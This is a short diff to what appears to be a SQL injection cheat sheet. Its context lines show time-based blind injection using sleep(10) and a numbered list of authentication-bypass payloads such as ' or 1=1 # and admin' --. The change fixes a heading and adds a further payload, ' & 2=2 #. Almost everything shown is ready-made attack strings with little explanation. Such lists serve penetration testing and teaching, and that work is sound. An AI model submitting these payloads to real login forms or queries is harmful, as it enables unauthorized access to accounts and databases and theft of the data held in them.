@@ -93,7 +93,7 @@ Ex 1: "SELECT * FROM books WHERE bookid = -2 or sleep(10)#; <br>
 2. Condition time delay <br>
 Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
 
-#Authentication Bypass <br>
+# Authentication Bypass <br>
 1. admin' #  /*when user is admin */ <br>
 2. admin' -- /*space after double dash*/ <br>
 3. admin' or 1=1 # <br>
@@ -102,5 +102,5 @@ Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
 6. " or 2<1 #   /*When user input is quoted under double dash*/ <br>
 7. ' or 1=1 LIMIT 1 # <br>
 8. ' | 1=1 # <br>
-9. 
+9. ' & 2=2 # <br>
     
